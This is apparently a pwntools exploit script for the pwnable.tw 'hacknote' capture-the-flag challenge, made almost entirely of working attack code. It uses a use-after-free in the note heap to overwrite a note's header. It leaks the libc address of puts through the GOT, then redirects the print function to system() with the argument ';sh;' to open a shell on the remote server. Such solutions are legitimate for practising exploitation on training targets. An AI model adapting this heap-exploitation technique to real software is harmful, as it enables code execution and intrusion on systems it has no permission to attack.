from pwn import *
import sys


# Constants found by manual enumeration
PUTS_WRAPPER_ADDR = 0x0804862b


def i2b(i):
    return str(i).encode('utf-8')


def read_menu():
    MENU = (
        b'----------------------\n',
        b'HackNote\n',
        b'----------------------\n',
        b' 1. Add note\n',
        b' 2. Delete note\n',
        b' 3. Print note\n',
        b' 4. Exit\n',
        b'----------------------\n'
    )
    p.recvuntil(MENU)


def free_slot(idx):
    p.sendafter(b'Your choice :',b'2')
    p.sendafter(b'Index :', i2b(idx))
    p.recvuntil(b'Success\n')


def allocate_slot(content_size, content):
    p.sendafter(b'Your choice :',b'1')
    p.sendafter(b'Note size :', i2b(content_size - 0x4))
    p.sendafter(b'Content :', content)
    p.recvuntil(b'Success !\n')


def read_slot(idx):
    p.sendafter(b'Your choice :', b'3')
    p.sendafter(b'Index :', i2b(idx))
    content = p.readline()
    return content


def read_slot_no_content(idx):
    p.sendafter(b'Your choice :', b'3')
    p.sendafter(b'Index :', i2b(idx))


# p = process('./patched', env={'LD_PRELOAD': '/home/k/pwnabletw/hacknote/libc_32.so.6'})
p = remote('chall.pwnable.tw', 10102)
e = ELF('./patched')
libc = ELF('./libc_32.so.6')
context.log_level = 'debug'
if len(sys.argv) == 2 and sys.argv[1] == 'debug':
    gdb.attach(p)
    raw_input(b'Continue and press ENTER to send payload...')



# Start with allocating 4 fastbin chunks
allocate_slot(0x8, b'A' * (0x08 - 0x04)) # slot 0, h0|c0
allocate_slot(0x8, b'B' * (0x08 - 0x04)) # slot 1, h1|c1

# Now let's free them
free_slot(1)
free_slot(0)

# At this point we have all four chunks in fastbin_0x10
# FB_0x10 -> h0 -> c0 -> h1 -> c1

# Our goal is to swap header with content, so take only one chunk from list.
allocate_slot(0x90, b'C') # slot 2: h0|c3

# At this point we have three chunks in fastbin_0x10
# FB_0x10 -> c0 -> h1 -> c1

# This allocation will result in swaping content with header. 
# Note that slot 1 (h1|c1) is still accessable with header pointing to same chunk as new slot's content. 
# Therefore the content of new slot will overwrite the slot 1's header!
# We want to leak libc address. Till now, the program has used puts to display menu and so we will find an address to libc_puts inside got table.
allocate_slot(0x0c, p32(PUTS_WRAPPER_ADDR) + p32(e.got['puts'])) # slot 3, c0|h1
puts_addr = u32(read_slot(1)[:4])
libc_base = puts_addr - libc.symbols['puts']
log.info('[x] Found libc_base: ' + hex(libc_base))

# We are left with one chunk in fastbin_0x10. We won't use it.
# FB_0x10 -> c1

# Now we want to perform same trick again. We will invoke system function this time.
# But before we need to reallocate the slot as we can write only on allocation.
free_slot(3)

# Fastbins act as LIFO so we will get same chunks on next allocation!
# FB_0x10 -> c0 -> h1 -> c1

# Set system() function with ;sh; as arg. 
# Note: simple /bin/sh won't work. We overwrite the puts_wrapper with system address. And the logic expected an address of a string to print. Therefore if we provide a standard /bin/sh we would end with calling 
# system('\x08x04\x0a\x48/bin/sh') <- address would vary as ASLR is enabled
# So we just have to separete the 'sh' command with ';'.
system_addr = libc_base + libc.symbols['system']
allocate_slot(0x0c, p32(system_addr) + b';sh;') # slot 4, c0|h1

# We won't get a response here as no puts will be invoked
read_slot_no_content(1)

# SHELL!!!
p.interactive()

